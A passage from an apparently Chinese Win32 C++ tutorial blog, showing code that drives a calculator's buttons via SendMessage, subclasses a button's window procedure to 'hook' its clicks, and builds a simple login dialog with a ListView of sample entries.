class="number">0x87</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1006</span>:<span class="comment">//数字6</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x88</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1007</span>:<span class="comment">//数字7</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x89</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1008</span>:<span class="comment">//数字8</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x8A</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1009</span>:<span class="comment">//数字9</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x8B</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0011</span>:<span class="comment">//数字0</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x82</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0012</span>:<span class="comment">//小数点</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x54</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0013</span>:<span class="comment">//运算符 +</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x5D</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0014</span>:<span class="comment">//运算符 - </span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x5E</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0015</span>:<span class="comment">//运算符 *</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x5C</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0016</span>:<span class="comment">//运算符 /</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x5B</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x0018</span>:<span class="comment">//运算符 =</span></span><br><span class="line"><span class="built_in">SendMessage</span>(calc, WM_COMMAND, <span class="built_in">MAKEWPARAM</span>(<span class="number">0x79</span>, BN_CLICKED), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, msg, wparam, lparam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题：拦截控件消息"><a href="#题：拦截控件消息" class="headerlink" title="题：拦截控件消息"></a>题：拦截控件消息</h2><p>控件的窗口类，是系统自己注册的，所以，控件的消息处理函数，也是系统自己的。我们如果想要得到控件消息，就需要截获到控件的消息处理函数。</p><p>GetClassLong 能够获取一个已经注册的窗口的类中的属性</p><p>SetClassLong 能够设置一个窗口，对应的窗口类中的属性</p><p>示例：我们使用SetClassLong实现修改按钮的光标</p><h3 id="修改按钮的cursor属性"><a href="#修改按钮的cursor属性" class="headerlink" title="//修改按钮的cursor属性"></a>//修改按钮的cursor属性</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HCURSOR hCursor = <span class="built_in">LoadCursor</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDC_CURSOR1));</span><br><span class="line"><span class="built_in">SetClassLong</span>(hButton4, GCL_HCURSOR, (LONG)hCursor);</span><br></pre></td></tr></table></figure><h3 id="修改控件回调"><a href="#修改控件回调" class="headerlink" title="//修改控件回调"></a>//修改控件回调</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">// 旧的窗口回调，</span></span><br><span class="line">WNDPROC g_oldProc = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">ButtonProc</span><span class="params">(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">L&quot;你被hook了&quot;</span>, <span class="string">L&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用默认的处理函数</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">CallWindowProc</span>(DefWindowProc, hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;按钮1&quot;</span>, WS_CHILD | WS_VISIBLE,</span><br><span class="line"><span class="number">10</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">20</span>, hWnd, (HMENU)<span class="number">0x1001</span>, <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;hook&quot;</span>, WS_CHILD | WS_VISIBLE,</span><br><span class="line"><span class="number">10</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">20</span>, hWnd, (HMENU)<span class="number">0x1002</span>, <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateWindow</span>(<span class="string">L&quot;button&quot;</span>, <span class="string">L&quot;unhook&quot;</span>, WS_CHILD | WS_VISIBLE,</span><br><span class="line"><span class="number">10</span>, <span class="number">70</span>, <span class="number">50</span>, <span class="number">20</span>, hWnd, (HMENU)<span class="number">0x1003</span>, <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="built_in">LOWORD</span>(wParam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1001</span>:</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">L&quot;我是按钮&quot;</span>, <span class="string">L&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1002</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取按钮1 的句柄</span></span><br><span class="line">HWND hButton1 = <span class="built_in">GetDlgItem</span>(hWnd, <span class="number">0x1001</span>);</span><br><span class="line"><span class="comment">// 替换原本的消息回调</span></span><br><span class="line">g_oldProc =</span><br><span class="line">(WNDPROC)<span class="built_in">SetWindowLong</span>(hButton1, GWL_WNDPROC, (LONG)ButtonProc);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x1003</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取按钮1 的句柄</span></span><br><span class="line">HWND hButton1 = <span class="built_in">GetDlgItem</span>(hWnd, <span class="number">0x1001</span>);</span><br><span class="line"><span class="comment">// 替换原本的消息回调</span></span><br><span class="line"><span class="built_in">SetWindowLong</span>(hButton1, GWL_WNDPROC, (LONG)g_oldProc);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ <span class="type">int</span> nShowCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1.注册窗口类</span></span><br><span class="line">WNDCLASS wc = &#123;&#125;;</span><br><span class="line"><span class="comment">// 窗口回调</span></span><br><span class="line">wc.lpfnWndProc = WndProc;</span><br><span class="line"><span class="comment">// 窗口类名</span></span><br><span class="line">wc.lpszClassName = <span class="string">L&quot;myClass&quot;</span>;</span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;wc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.创建窗口</span></span><br><span class="line">HWND hWnd = <span class="built_in">CreateWindow</span>(<span class="string">L&quot;myClass&quot;</span>, <span class="string">L&quot;我的窗口&quot;</span>, WS_OVERLAPPEDWINDOW,</span><br><span class="line"><span class="number">40</span>, <span class="number">40</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.更新显示窗口</span></span><br><span class="line"><span class="built_in">UpdateWindow</span>(hWnd);</span><br><span class="line"><span class="built_in">ShowWindow</span>(hWnd, SW_SHOW);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.建立消息循环</span></span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题：校园学生登录"><a href="#题：校园学生登录" class="headerlink" title="题：校园学生登录"></a>题：校园学生登录</h2><p>里面有图片控件是直接在可视化界面导入的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;resource.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;comdef.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Commctrl.h&gt;</span><span class="comment">//通用控件必备头</span></span></span><br><span class="line"><span class="comment">//全局的实例句柄</span></span><br><span class="line"><span class="type">static</span> HINSTANCE g_hInstance;</span><br><span class="line"><span class="comment">//全局的父窗口句柄</span></span><br><span class="line">HWND g_hDlg;</span><br><span class="line"><span class="comment">//非模态回调</span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"><span class="comment">//手动回调</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndPorc</span><span class="params">(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE lProInstance, LPSTR lpCmdLine, <span class="type">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">g_hInstance = hInstance;</span><br><span class="line">HWND hDlg=<span class="built_in">CreateDialog</span>(hInstance,<span class="built_in">MAKEINTRESOURCE</span>(IDD_DIALOG1),<span class="literal">NULL</span>, DlgProc);</span><br><span class="line">g_hDlg = hDlg;</span><br><span class="line"><span class="built_in">ShowWindow</span>(hDlg,SW_SHOW);</span><br><span class="line">MSG msg = &#123;&#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//回调</span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">DlgProc</span><span class="params">(HWND hWnd,UINT Message,WPARAM wParam,LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (Message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="built_in">LOWORD</span>(wParam))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> IDOK2:<span class="comment">//登录控件</span></span><br><span class="line">&#123;</span><br><span class="line">HWND hBt = <span class="built_in">GetDlgItem</span>(hWnd, IDOK2);</span><br><span class="line"><span class="comment">//SendMessage(hBt, BM_GETCHECK,0,0);</span></span><br><span class="line"><span class="comment">//MessageBox(hBt,L&quot;无法连接服务器&quot;,L&quot;提示&quot;,1);</span></span><br><span class="line"><span class="comment">//获取文本框句柄</span></span><br><span class="line">HWND hedit_user = <span class="built_in">GetDlgItem</span>(hWnd, IDC_EDIT3);</span><br><span class="line">HWND hedit_passwd = <span class="built_in">GetDlgItem</span>(hWnd, IDC_EDIT2);</span><br><span class="line"><span class="comment">//定义文本框获取缓冲区</span></span><br><span class="line">WCHAR c_User[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">WCHAR c_Passwd[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//获取编辑框中是文本</span></span><br><span class="line"><span class="built_in">GetWindowText</span>(hedit_user, c_User,<span class="number">20</span>);</span><br><span class="line"><span class="built_in">GetWindowText</span>(hedit_passwd, c_Passwd, <span class="number">20</span>);</span><br><span class="line">WCHAR C_MAX[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//将用户名转换成char*用于使用strcmp函数的比较</span></span><br><span class="line"><span class="function"><span class="type">_bstr_t</span> <span class="title">c_UTemp</span><span class="params">(c_User)</span></span>;<span class="comment">//将WHCHAR* 转换位char*</span></span><br><span class="line"><span class="function"><span class="type">_bstr_t</span> <span class="title">c_PTemp</span><span class="params">(c_Passwd)</span></span>;<span class="comment">//将WHCHAR* 转换位char*</span></span><br><span class="line"><span class="comment">//设置一个可以登录的用户名或密码</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* u_temp = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* p_temp = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">//int i = strcmp(c_UTemp, u_temp);</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">strcmp</span>(c_UTemp, u_temp)==<span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(c_PTemp, p_temp)==<span class="number">0</span>))<span class="comment">//等于0说明账户名和密码都相等，验证成功</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ShowWindow</span>(hWnd,SW_HIDE);<span class="comment">//隐藏主窗口</span></span><br><span class="line"></span><br><span class="line">HWND hMain = <span class="built_in">CreateDialog</span>(g_hInstance,<span class="built_in">MAKEINTRESOURCE</span>(IDD_DIALOG2) ,g_hDlg, DlgProc);</span><br><span class="line"><span class="comment">//初始化界面</span></span><br><span class="line"><span class="comment">//1,初始化图片</span></span><br><span class="line">HBITMAP hBit_map = <span class="built_in">LoadBitmap</span>(g_hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDB_BITMAP1));</span><br><span class="line">HWND hPic=<span class="built_in">GetDlgItem</span>(hMain, IDC_STATIC1);<span class="comment">//获取图片框资源句柄</span></span><br><span class="line"><span class="built_in">SendMessage</span>(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</span><br><span class="line"><span class="comment">//2，初始化列表</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//1. 获取列表框的句柄</span></span><br><span class="line">HWND hListCtrl = <span class="built_in">GetDlgItem</span>(hMain, IDC_LIST3);</span><br><span class="line"><span class="built_in">ListView_SetExtendedListViewStyle</span>(hListCtrl, LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);</span><br><span class="line"><span class="comment">//添加第一列</span></span><br><span class="line">LVCOLUMN lv = &#123;&#125;;</span><br><span class="line">lv.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT;</span><br><span class="line">lv.cx = <span class="number">112</span>;<span class="comment">//112正好对应该窗口的宽度为4列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;年份&quot;</span>);</span><br><span class="line">lv.fmt = LVCFMT_CENTER;</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">0</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第二列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;时间&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">1</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第三列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;经历&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">2</span>, &amp;lv);</span><br><span class="line"><span class="comment">//添加第四列</span></span><br><span class="line">lv.pszText = (TCHAR*)_T(<span class="string">&quot;备注&quot;</span>);</span><br><span class="line"><span class="built_in">ListView_InsertColumn</span>(hListCtrl, <span class="number">3</span>, &amp;lv);</span><br><span class="line"></span><br><span class="line">LVITEM  li = &#123;&#125;;</span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">0</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2009&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学附中就读&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">0</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;班长一职&quot;</span>));</span><br><span class="line"><span class="comment">//添加第二行</span></span><br><span class="line">li.mask = LVIF_TEXT;</span><br><span class="line">li.iItem = <span class="number">1</span>;</span><br><span class="line">li.pszText = (TCHAR*)_T(<span class="string">&quot;2001&quot;</span>);</span><br><span class="line"><span class="comment">//添加一行，但是没有设置本行单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_InsertItem</span>(hListCtrl, &amp;li);</span><br><span class="line"><span class="comment">//要设置单元格的内容</span></span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">1</span>, (TCHAR*)_T(<span class="string">&quot;9月5日&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">2</span>, (TCHAR*)_T(<span class="string">&quot;清华大学&quot;</span>));</span><br><span class="line"><span class="built_in">ListView_SetItemText</span>(hListCtrl, <span class="number">1</span>, <span class="number">3</span>, (TCHAR*)_T(<span class="string">&quot;学生会主席&quot;</span>));</span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">ShowWindow</span>(hMain, SW_SHOW);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">_stprintf_s(C_MAX, _T(<span class="string">&quot;账号或密码错误，请确认！\n\t账号：%s\n\t密码：%s&quot;</span>), c_User, c_Passwd);</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, C_MAX, <span class="string">L&quot;提示&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_NOTIFY:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//1. 先获取小结构体中的信息，做大致判断</span></span><br><span class="line">LPNMHDR pNm = (LPNMHDR)lParam;</span><br><span class="line"><span class="keyword">if</span> (pNm-&gt;idFrom == IDC_LIST3 &amp;&amp; pNm-&gt;code == 